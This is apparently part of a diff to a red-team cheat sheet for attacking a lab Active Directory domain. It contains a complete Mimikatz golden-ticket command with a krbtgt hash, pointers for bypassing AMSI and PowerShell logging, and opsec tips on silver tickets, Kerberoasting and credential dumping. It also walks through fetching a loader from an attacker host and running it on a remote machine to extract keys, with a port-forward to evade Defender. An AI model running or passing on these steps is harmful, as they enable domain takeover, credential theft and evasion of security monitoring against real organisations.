 ## If we forge a Golden Ticket with SID History of the Domain Controllers group and Enterprise Domain Controllers Group, there are less chances of detection by ATA:
 `Invoke-Mimikatz -Command '"kerberos::golden /user:dcorp-dc$ /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /groups:516 /sids:S-1-5-21-280534878-1496970234-700767426-516,S-1-5-9 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ptt"'`
+
+# Evade powershell logging and AMSI bypass (https://github.com/OmerYa/Invisi-Shell)
+-> Patches AMSI
+-> System wide transcription
+-> Script block logging
+
+### Obfuscation
+For Rubeus.exe, use ConfuserEx (https://github.com/mkaring/ConfuserEx) to obfuscate the binary.
+
+## Notes
+### General way 2: of opsec.
+# When an admin is running as a service on a machine we can extract clear text pass with sekurlsa::ekeyes.
+
+### Thinks to remember 3: opsec
+If our target is 2016 and before then after using a golden ticket or a silver ticket we cant use winrs or powershell remoting however u can still run commands using wmi (`gwmi -C win32_computersystem -ComputerName dcorp-dc`). If its 2019 ++ you have no problem.
+
+### Thinks to remember 4: opsec
+Using silver ticket might be fancy becuase Miscrosoft MDI doesnt care about silver tickets and in some cases we dont touch the DC but our persistence period by default is 30 days for computer accounts. Also have in mind that if we want to do multiple things even when targeting a DC(not recommended) we have to create different tickets for different purposes(ex: HOST to create a schtask)
+
+### Thinks to remember 5: opsec
+If you try to create a silver ticket and use /service:HTTP in order to use winrm it wont work if its 2016.
+
+###  Thinks to remember 6: opsec
+When you get access to a new user it is worth checking if he/she has local admin access to any other machine
+
+### Thinks to remember 7: opsec
+In cases you run sekurlsa::ekeys and if you find many aes keys for the same user check the SID always, and for example in case of a resource based constrained delegated scenario would pick S-1-5-18 which is the admin one !
+
+### Thinks to remember 8: opsec
+Use silver tickets for staying under the radar dont do stupidities like adding ur account to domain admin group with that, be smart.
+
+### Thinks to remember 9: opsec
+Kerboroasting on the best attacks for staying under the radar, if you manage to guess the pass(I mean its RC4 ... hope you do it !)
+
+### Thinks to remember 10: opsec
+ACL attacks are interesting and very profitable, i would also say that there are stealthier than others.
+
+## Thinks to remember 11: opsec
+Credential theft protections(Credential Guard,Protected users group) are not protecting against extracting credential from the registry, only from lsass. Credentials for local accounts in SAM and Service account
+credentials from LSA Secrets are NOT protected.
+
+## Things to remember 12: When looking for domain admins you should always check the SID if the last three digits are 500, because someone might have renamed him. On the other hand on a non-domain machine when you are not local admin, you cant find that if they are renamed.
+
+### Behavioural bypassing
+## Scenario 1: We have remote access to another machine and we want to use a binary to download something and execute it in the memory. An executable trying to download another executable or something from a remote server will trigger bevaviour base detection from defender. Instead portforward your own port and download it from 127.0.0.1 which will not be a remote server.
+**Example:**
+`winrs -r;dcorp-mgmt hostname:whoami` -> "From our machine exec on the other machine"
+`iwr http://172.16.100.1/Loader.exe -OutFile C:\Users\Public\Loader.exe` "Download on our machine"
+`echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe` "Copy on the rmt machine"
+`winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://172.16.100.1/Loader.exe sekurlsa::ekeys exit` "Wrong way as executable tries to download another executable and run it from 'remote server'"
+`winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=127.16.100.1`"Correct way as we forward our port as the remote machine localhost port access, so it seems that the remote machine is downloading from itself and not from a remote server"
+############################################################################
+### Noisy commands that and should be avoided :
+## Scenario 2: In general the idea is when you ask something from the DC and you spam all the machines in the network you will leave logs on all the machines and you will cause a network spike.
